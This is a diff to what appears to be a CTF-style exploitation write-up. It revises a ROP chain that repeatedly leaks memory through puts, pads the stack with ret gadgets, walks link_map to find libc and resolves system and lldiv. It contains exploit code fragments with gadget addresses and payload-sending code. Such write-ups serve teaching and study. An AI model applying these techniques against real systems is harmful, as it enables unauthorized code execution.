@@ -120,19 +120,17 @@ My first attempt was using python's `subprocess.Popen` plus `stdbuf -i0 -o0 -e0`
 
 Then i noticed that [this](https://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/) uses binexpect, and i decided to give it a try. I had to port my code to python3 (pardon me if the code sucks), plugged in binexpect and obtained this:
 
-* the read error persists, even playing with delays seems to not solve the issue
+* the segfault error persisted, but turned out to be a stack balancing issue unrelated to input/output itself, see below
 * the `pwned` or `prompt` functions work great
 
-To overcome the segfault issue, this is my workaround:
 
-* persist the state of searches, storing only offsets, also on the file system
-* when the binary dies after a read, it is restarted
-* only the base addresses are recovered at each restart
-* the symbols search will resume from where it stopped
+## Solving unbalanced stack issue
 
-This works under the assumption that libc offsets don't change across different launches. This is commonly true, as ASLR only changes the base address.
+By repeatedly injecting rop chains into the stack, it happened that the value of `rsp` was **constantly growing, uncontrollably overwriting environment variables and causing issues and segfaults**.
 
-Actually i could investigate more, because it's still unclear to me why err function is causing a segfault (while attempting to read environment variables). I suspect it is a stack alignment issue, but i'm too lazy to do it now.
+To overcome this problem, it is necessary to find a way to have a constant value of `rsp` at each repetition of the repeatalb leak.
+
+In this case, the solution is to return to the entry point at each repetition (instead of returning to `main` again). This, by itself, led to a constant **decrease** of `rsp` value, but this is more easily fixable by inserting padding into the rop chain, to increase `rsp` of the same amount. 
 
 
 ## The basic building block: repeatable leak
@@ -166,7 +164,8 @@ XXXXXXXX         | 8 bytes        | Overwrites saved frame pointer (don't care)
 0x00400703       | 8 bytes        | pop rdi; ret;
 YYYYYYYY			  | 8 bytes		| address of content to be leaked
 0x004004c0		| 8 bytes			| address of `puts` in the plt (initialized after the first use)
-0x0040060d		| 8 bytes			| address of `main` to allow repetition
+0x00400704		| 176 bytes		| address of a `ret;` gadget, repeated 22 times, to keep `rsp` value constant against repetitions
+0x00400520		| 8 bytes			| address of entry point, to allow repetition
 
 Here is the python code to perform the leak:
 
@@ -179,10 +178,32 @@ def leak(address):
         0x00400703, # pop rdi; ret;
         address,    # leak
         0x004004c0, # puts@plt
-        0x0040060d, # main again
-        )
+        
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
 
-    
+        0x00400520, # entry point again
+        )
 
     s7.sendbinline(payload)
 
@@ -241,7 +262,7 @@ As explained earlier, a pointer to `libc_map` is stored at a known address into 
 
 ### Surfing `link_map` to find libc
 
-The `libc_map` structure definition can be found in `/usr/include/link.h`:
+The `link_map` structure definition can be found in `/usr/include/link.h`:
 
 ```c
 struct link_map
@@ -256,7 +277,7 @@ struct link_map
   };
 ```
 
-Actually, the full `libc_map` structure is more complex than this, but the above are the only fields which are safe to be used, because they are standardized and unlikely to change between versions.
+Actually, the full `link_map` structure is more complex than this, but the above are the only fields which are safe to be used, because they are standardized and unlikely to change between versions.
 
 My naive python code to traverse the list and get libc base and dynamic section is as follows:
 
@@ -307,7 +328,7 @@ def get_symbol(symbol, strtab, symtab, libc_map):
 ```
 This time, the dynamic section address points to the one mapped in our process' space, and it is therefore readable.
 
-The `libc_map` variable is an instance of `LibcMap`, a class used to persist search state across program crashes and across exploit runs, which stores relative offsets of symbols and the current search progress:
+The `libc_map` variable is an instance of `LibcMap`, a class used to keep current found symbols from libc, which stores relative offsets of symbols and the current search progress:
 
 ```python
 class LibcMap:
@@ -315,29 +336,10 @@ class LibcMap:
     libc_map = {}
     last_scanned_offset = 0
 
-    def __init__(self, cache="./~libcmap"):
-        self.cache = cache
-        self.restore()
-
-    def restore(self):
-        try:
-            with open(self.cache,'r') as f:
-                state = json.loads(f.read())
-                self.libc_map = state["libc_map"]
-                self.last_scanned_offset = state["last_scanned_offset"]
-        except:
-            print( "error reading cached libcmap")
-
-    def save(self):
-        with open(self.cache,'w') as f:
-            state = { "libc_map" : self.libc_map, "last_scanned_offset": self.last_scanned_offset }
-            f.write(json.dumps(state))
-
     def put(self, symbol, address, scanned_offset):
         if address != 0:
             self.libc_map[str(symbol,'utf-8')] = address
         self.last_scanned_offset = scanned_offset
-        self.save()
 
     def get(self, symbol):
         if symbol in self.libc_map:
@@ -484,9 +486,9 @@ while True:
         if system == None or lldiv == None:
             strtab, symtab = get_str_symtab(libc_dynamic)
             if system == None:
-                system = get_symbol("system", strtab, symtab, libc_map)
+                system = get_symbol(b"system", strtab, symtab, libc_map)
             if lldiv == None:
-                lldiv = get_symbol("lldiv", strtab, symtab, libc_map)
+                lldiv = get_symbol(b"lldiv", strtab, symtab, libc_map)
 
     except Exception as e:
         setup = binexpect.setup("./s7")
